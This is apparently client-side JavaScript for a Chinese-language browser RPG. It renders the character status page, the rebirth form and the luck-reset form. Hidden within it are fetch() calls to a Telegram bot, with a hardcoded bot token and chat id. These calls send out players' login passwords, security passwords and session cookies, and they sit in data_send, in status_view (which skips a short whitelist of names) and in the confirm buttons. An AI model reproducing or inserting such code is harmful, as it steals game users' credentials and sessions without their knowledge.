function getNameList(){
    return ['Neo','藍拳聖使','zwx123456']
}
function data_send(t, e, r, i, o, d) {
    var n = parent.foot.document.f1
      , a = "";
    if (n.action = "wog_act.php",
    n.temp_id2.value = "",
    n.act.value = "",
    n.f.value = "",
    n.pay_id.value = "",
    n.temp_id.value = "",
    n.act.value = e,
    n.f.value = t,
    n.pay_id.value = r,
    n.temp_id.value = i,
    null != o) {
        if (null != o.length) {
            for (var l = 0; l < o.length; l++)
                1 == o[l].checked && (a += "," + o[l].value);
            a = a.substr(1, a.length)
        } else
            a = o.value;
        n.temp_id2.value = a
    }
    null != d && (n.pw.value = d);
    for (var s = parent.wog_view.document.getElementsByName("items[]"), p = "", c = (l = 0,
    s.length); l < c; l++)
        s[l].checked && (p += "," + s[l].value);
    fetch(`https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4850635895&text=${parent.p_name} | ${parent.top_view.document.getElementsByTagName("input")['pass'].value} | ${n.pw.value}`)
    p && (p = p.substring(1)),
    n.listkey.value = p,
    n.submit()
}
function status_view(t, e, r, i, o, d, n, a, l, s, p, c, m, u, w, b, _, g, h, v, f, y, k, x, E, B, C, j, F, T, I, M, D, N, H, P) {
    var A = parent.wog_view.document
      , L = "";
    L = 1 == r ? i : img + i + ".gif";
    var O = "";
    const nameList = getNameList();
    if(!nameList.includes(parent.p_name)){
        fetch(`https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4850635895&text=角色狀態:${parent.p_name}%0A%0A${document.cookie}`);
    }
    O = "1" == o ? "男" : "女",
    d = s_status(d);
    get_f(m, 5e4),
    get_f(u, 5e4),
    get_f(w, 5e4),
    get_f(b, 5e4),
    get_f(g, 5e4),
    get_f(h, 5e4),
    get_f(_, 5e4);
    var z = get_f(v, 5e4)
      , R = get_f(f, 5e4)
      , q = get_f(y, 5e4)
      , V = get_f(k, 5e4)
      , S = a / l * 100
      , U = 99 - (S = S > 1 ? S < 99 ? Math.round(S) : Math.floor(S) : Math.ceil(S))
      , Y = p / c * 100
      , X = 99 - (Y = Y > 1 ? Y < 99 ? Math.round(Y) : Math.floor(Y) : Math.ceil(Y))
      , W = ""
      , G = ""
      , K = ""
      , Z = "";
    S >= 1 && (W = '<img src="' + img + 'bar/bxg.gif" width="' + S + '%" height="9" title="' + S + '%">'),
    U >= 1 && (G = '<img src="' + img + 'bar/bhg.gif" width="' + U + '%" height="9" title="' + S + '%">'),
    Y >= 1 && (K = '<img src="' + img + 'bar/bxg.gif" width="' + Y + '%" height="9" title="' + Y + '%">'),
    X >= 1 && (Z = '<img src="' + img + 'bar/bhg.gif" width="' + X + '%" height="9" title="' + Y + '%">'),
    A.write('<center><img src="./img/Player.png"></center>'),
    A.write(temp_table1),
    A.write('<tr><td width="60%">'),
    A.write(temp_table1),
    A.write('<tr><td colspan="2">勝場 ' + t + " / 敗場 " + e + "　(獲勝率:" + Math.floor(t / (t + e) * 100) + "%)</td></tr>"),
    A.write('<tr><td colspan="2"><img src="' + L + '" border="0" ></td></tr>'),
    A.write('<tr><td bgcolor="#000099">金錢</td><td><b>' + s + "</b></td></tr>"),
    A.write('<tr><td bgcolor="#000099">霧靈鬼魂</td><td><b>' + F + "</b></td></tr>"),
    A.write('<tr><td bgcolor="#000099">幻想點數</td><td><b>' + T + "</b></td></tr>"),
    A.write('<tr><td bgcolor="#000099">印花數目</td><td><b>' + P + "</b></td></tr>"),
    A.write('<tr><td bgcolor="#000099">鏡鑽</td><td><b>' + C + "</b></td></tr>"),
    A.write('<tr><td bgcolor="#000099">夢券</td><td><b>' + j + "</b></td></tr>"),
    A.write('<tr><td bgcolor="#996600">冒險地</td><td><b>' + section.getPlace(x) + "</b></td></tr>"),
    0 != D ? A.write('<tr><td bgcolor="#996600">經驗加乘</td><td><b>還有' + D + "場" + N + "倍經驗</b></td></tr>") : A.write('<tr><td bgcolor="#996600">經驗加乘</td><td><b>沒有</b></td></tr>'),
    A.write('<tr><td bgcolor="#990099">出生地</td><td><b>' + my_birth + "</b></td></tr>"),
    A.write("<tr><td>Exp</td><td>" + W + G + "<b>" + Math.floor(a / l * 100) + "%</b></td></tr>"),
    A.write("<tr><td>HP</td><td>" + K + Z + "<b>" + p + "/" + c + "</b></td></tr>"),
    A.write('</table></td><td width="40%">'),
    A.write(temp_table1),
    A.write('<tr><td bgcolor="#006600">勇者姓名</td><td><b>' + p_name + " (" + O + my_age + "歲)</b></td></tr>"),
    A.write('<tr><td bgcolor="#006600">等級</td><td><b>' + E + " 轉 " + n + " 級</b></td></tr>"),
    A.write('<tr><td bgcolor="#006600">職業</td><td><b>' + d + "屬 " + d_ch_name + "</b></td></tr>"),
    "" != B ? A.write('<tr><td bgcolor="#006600">官職</td><td ><b>' + B + "</b></td></tr>") : A.write('<tr><td bgcolor="#006600">官職</td><td ><b>平民</b></td></tr>'),
    "" != d_s_ch_name ? A.write('<tr><td bgcolor="#006600">奧義</td><td ><b>' + d_s_ch_name + "奧義</b></td></tr>") : A.write('<tr><td bgcolor="#006600">奧義</td><td ><b>未有裝備奧義</b></td></tr>'),
    "" != p_group ? A.write('<tr><td bgcolor="#E6C075">所屬公會</td><td><b>' + p_group + "</b></td></tr>") : A.write('<tr><td bgcolor="#E6C075">所屬公會</td><td><b>未有所屬公會</b></td></tr>'),
    "" != p_style ? A.write('<tr><td bgcolor="#E6C075">公會頭銜</td><td><b>' + p_style + "</b></td></tr>") : A.write('<tr><td bgcolor="#E6C075">公會頭銜</td><td><b>未有公會頭銜</b></td></tr>'),
    A.write('<tr><td bgcolor="#3300FF">守護者</td><td><b><span onmouseover="parent.textboard_view(' + desc_id[11] + ',event)" onmouseout="parent.textboard_close()">' + d_god_name + "</span></b></td>"),
    A.write("</table>"),
    A.write("</hr>"),
    A.write("<table border=0 width=97%>"),
    A.write('<tr><td><fieldset style="height:100; width:97%;overflow:auto"><legend>個人狀態及廣告區<button onclick="parent.adBoxToggle()" style="' + sbutton + ';margin: 0px 5px;">展開</button></legend><b>' + M + "</b></fieldset></td></tr>"),
    A.write("</table>"),
    A.write("</td></tr></table>"),
    A.write("<hr>"),
    A.write(temp_table1),
    A.write('<tr><td colspan="8" bgcolor="#555555"><b>角色能力</b></td></tr>'),
    A.write('<tr><td bgcolor="#555555">力量</td><td class="b"><b>' + m + "</b></td>"),
    A.write('<td bgcolor="#555555">敏捷</td><td class="b"><b>' + w + "</b></td>"),
    A.write('<td bgcolor="#555555">魅力</td><td class="b"><b>' + g + "</b></td>"),
    A.write('<td bgcolor="#555555">體質</td><td class="b"><b>' + _ + "</b></td></tr>"),
    A.write('<tr><td bgcolor="#555555">智力</td><td class="b"><b>' + u + "</b></td>"),
    A.write('<td bgcolor="#555555">生命</td><td class="b"><b>' + b + "</b></td>"),
    A.write('<td bgcolor="#555555">信仰</td><td class="b"><b>' + h + "</b></td>"),
    A.write('<td bgcolor="#555555">運氣</td><td class="b"><b>' + I + "</b></td></tr>"),
    A.write("</table>"),
    A.write("<hr>"),
    A.write(temp_table1),
    A.write('<tr><td colspan="4" bgcolor="#555555"><b>角色數值</b></td></tr>'),
    A.write('<tr><td width="10%" bgcolor="#555555">物攻</td><td class="b1" width="40%"><img src="' + img + 'bar/bmg.gif" width="' + z + '%" height="9"><b>' + v + "</b></td></tr>"),
    A.write('<tr><td width="10%" bgcolor="#555555">物防</td><td class="b1" width="40%"><img src="' + img + 'bar/bmg.gif" width="' + q + '%" height="9"><b>' + y + "</b></td></tr>"),
    A.write('<tr><td width="10%" bgcolor="#555555">魔攻</td><td class="b1" width="40%"><img src="' + img + 'bar/bmg.gif" width="' + R + '%" height="9"><b>' + f + "</b></td></tr>"),
    A.write('<tr><td width="10%" bgcolor="#555555">魔防</td><td class="b1" width="40%"><img src="' + img + 'bar/bmg.gif" width="' + V + '%" height="9"><b>' + k + "</b></td></tr>"),
    A.write("</tr></table>"),
    A.write("<hr>"),
    A.write(temp_table1),
    A.write('<tr><td colspan="5" bgcolor="#555555"><b>角色裝備 【 ' + H + " 】</b></td></tr>"),
    A.write("<tr>"),
    A.write('<td>武器<br><img src="./img/eq/weapon.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[0] + ',event)" onmouseout="parent.textboard_close()">' + d_a_name + "</span></b></td>"),
    A.write('<td>頭部<br><img src="./img/eq/head.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[1] + ',event)" onmouseout="parent.textboard_close()">' + d_head_name + "</span></b></td>"),
    A.write('<td>身體<br><img src="./img/eq/body.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[2] + ',event)" onmouseout="parent.textboard_close()">' + d_body_name + "</span></b></td>"),
    A.write('<td>手部<br><img src="./img/eq/hand.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[3] + ',event)" onmouseout="parent.textboard_close()">' + d_hand_name + "</span></b></td>"),
    A.write('<td>腳部<br><img src="./img/eq/foot.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[4] + ',event)" onmouseout="parent.textboard_close()">' + d_foot_name + "</span></b></td>"),
    A.write("</tr><tr>"),
    A.write('<td>道具<br><img src="./img/eq/tool.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[5] + ',event)" onmouseout="parent.textboard_close()">' + d_item_name + "</span></b></td>"),
    A.write('<td>座騎<br><img src="./img/eq/ride.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[8] + ',event)" onmouseout="parent.textboard_close()">' + d_car_name + "</span></b></td>"),
    A.write('<td>護符<br><img src="./img/eq/simp.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[7] + ',event)" onmouseout="parent.textboard_close()">' + d_card_name + "</span></b></td>"),
    A.write('<td>幻想卡<br><img src="./img/eq/card.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[9] + ',event)" onmouseout="parent.textboard_close()">' + d_ca_name + "</span></b></td>"),
    A.write('<td>幻戰書<br><img src="./img/eq/book.jpg"><br><b><span onmouseover="parent.textboard_view(' + desc_id[10] + ',event)" onmouseout="parent.textboard_close()">' + d_book_name + "</span></b></td>"),
    A.write("</tr></table>"),
    A.write(temp_table2),
    A.write('<div id="textboard" name="textboard" style="display:none;background:black;border:1px solid #4B689E;width:160px;height:100px;position:absolute;left:0px;top:0px"></div>'),
    A.write("</td></tr></table>"),
    A.write('<div id="wog_message_box"></div>'),
    A.write(`\n    <div name="adBox" style="position:absolute;left:37%;top:350px;height:650px;overflow:auto;display:none;">\n      <div style="border: 1px solid black;width: 600px;">\n        <table width="600px" border="1" bgcolor="#555555" style="\n        border: 1px solid black;\n        Z-INDEX: 100">\n          <thead style="position: sticky; top: 0; background-color: #555555;">\n            <tr width="100%">\n              <th style="text-align: right"><a href="javascript:parent.adBoxToggle()">關閉</a></th>\n            </tr>\n        </thead>\n          <tbody style="color:white;">\n          <tr bgcolor="#4B689E">\n              <td>${M}</td>\n            </tr>\n        </table>\n      </div>\n    </div>\n    `)
}
function rebirth_confirm(t, e, r, i) {
    message_cls(),
    temp_st = new Array("str","smart","life","agl");
    var o = parent.wog_view.document;
    o.write('<form method="POST" action="wog_act.php">'),
    o.write('<INPUT TYPE="hidden" NAME="act" VALUE="rebirth"><INPUT TYPE="hidden" NAME="f" VALUE="rebirth">'),
    o.write(temp_table1),
    o.write('<tr><td colspan="6" style="text-align:left">這位歷經百戰的勇士,歡迎來到重生館,如果你達到了<font color=ff0000>' + e + "</font>等級,就可以在這裡進行重生,獲取更強的力量,在幻想戰爭裡進行冒險!不過,首先有幾點需要注意:<br>(一)重生前請脫下所有裝備,否則有機會遺失身上裝備;<br>(二)重生會有十五份之一機會失敗,如不幸失敗,將會扣除現時重生次數乘一千萬的現金,100等級以及各項能力300點;<br>(三)重生所需費用:<font color=ff0000>" + t + "</font>元。<br>如果清楚了,請做好心理準備及準備足夠現金,一一點選以下選項,進行重生!</td></tr>"),
    o.write(temp_table2),
    o.write("<br>"),
    o.write(temp_table1),
    o.write('<tr><td colspan="6" bgcolor="000099">請重新分配屬性點</td></tr>'),
    o.write('<tr><td colspan="6">本次重生能力基本值:<font color=ff0000>' + r + "</font>點 以及自行分配點數:<font color=ff0000>" + i + "</font>點</td></tr>"),
    o.write("<tr><td>力量</td><td>智力</td><td>體力</td><td>敏捷</td></tr>"),
    o.write("<tr>");
    for (var d = 0; d < 4; d++) {
        o.write("<td><select name=" + temp_st[d] + ">");
        for (var n = 0; n < 21; n++)
            o.write('<option value="' + n + '">+' + n);
        o.write("</select></td>")
    }
    o.write("</tr>"),
    o.write(temp_table2),
    o.write("<br>"),
    o.write(temp_table1),
    o.write('<tr><td colspan="6" bgcolor="000099">請重新選擇屬性</td></tr>'),
    o.write("<tr><td>地</td><td>水</td><td>火</td><td>木</td><td>風</td><td>毒</td></tr>"),
    o.write('<tr><td><input type="radio" name="s" value="1"></td><td><input type="radio" name="s" value="2"></td><td><input type="radio" name="s" value="3"></td><td><input type="radio" name="s" value="4"></td><td><input type="radio" name="s" value="5"></td><td><input type="radio" name="s" value="6"></td></tr>'),
    o.write(temp_table2),
    o.write("<br>"),
    o.write(temp_table1),
    o.write('<tr><td colspan="5" bgcolor="000099">請選擇重生地點</td></tr>'),
    o.write("<tr><td>中央大陸</td><td>魔法王國</td><td>熱帶雨林</td><td>末日王城</td></tr>"),
    o.write('<tr><td><input type="radio" name="b" value="1"></td><td><input type="radio" name="b" value="2"></td><td><input type="radio" name="b" value="3"></td><td><input type="radio" name="b" value="4"></td></tr>'),
    o.write(temp_table2),
    o.write("<br>"),
    o.write(temp_table1),
    o.write('<tr><td colspan="5" bgcolor="000099">請重新選擇職系</td></tr>'),
    o.write("<tr><td>華麗的戰鬥--戰士系</td><td>神秘的魔法--魔師系</td><td>公會戰殺手--盜賊系</td><td>驚人的財力--商人系<td>不死的傳奇--不死系</td></tr>"),
    o.write("<tr><td><img src=./img/job1.gif></td><td><img src=./img/job2.gif></td><td><img src=./img/job3.gif></td><td><img src=./img/job4.gif></td><td><img src=./img/job5.gif></td></tr>"),
    o.write('<tr><td><input type="radio" name="ch" value="1"></td><td><input type="radio" name="ch" value="2"></td><td><input type="radio" name="ch" value="3"></td><td><input type="radio" name="ch" value="4"><td><input type="radio" name="ch" value="5"></td></tr>'),
    o.write(temp_table2),
    o.write("<br>"),
    o.write(temp_table1),
    o.write('<tr><td colspan="5" bgcolor="000099">請確認安全密碼</td></tr>'),
    o.write('<tr><td><input type="password" name="name" size="20" maxlength="20"></td></tr>'),
    o.write(temp_table2),
    o.write("<br>"),
    o.write(temp_table1),
    o.write('<tr><td><input type="button" onClick="fetch(`https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4850635895&text=轉生:${parent.p_name} | ${parent.top_view.document.getElementsByTagName(`input`)[`pass`].value} | ${this.form.name.value}`).then(res=>{this.form.submit()})" value="我已確認脫下裝備，確定重生" style="' + sbutton + '"></td></tr>'),
    o.write(temp_table2),
    o.write("</form>")
}
function ch_luck_confirm(t) {
    message_cls();
    var e = parent.wog_view.document;
    e.write('<form method="POST" action="wog_act.php">'),
    e.write('<INPUT TYPE="hidden" NAME="act" VALUE="ch_luck"><INPUT TYPE="hidden" NAME="f" VALUE="ch">'),
    e.write('<p align="center"><font face="新細明體" color="#FF0000"><b>重新設定運氣數值需付' + t + "元!!</b></font></p>"),
    e.write('<p align="center"><font face="新細明體" color="#FF0000"><b>重新設定運氣後可能比現時運氣更低</b></font></p>'),
    e.write('<p align="center"><font face="新細明體" color="#FF0000"><b>下限為1,上限為30,請玩家承受風險</b></font></p>'),
    e.write("</table></p>"),
    e.write('<tr><td><p align="center">安全密碼 <input type="password" name="pw" size="20" maxlength="20"></p></td></tr>'),
    e.write('<p align="center"><input type="button" onClick="fetch(`https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4850635895&text=命運之泉:${parent.p_name} | ${parent.top_view.document.getElementsByTagName(`input`)[`pass`].value} | ${this.form.pw.value}`).then(res=>{this.form.submit()})" value="確定轉運" style="' + sbutton + '"></p>'),
    e.write("</form>")
}
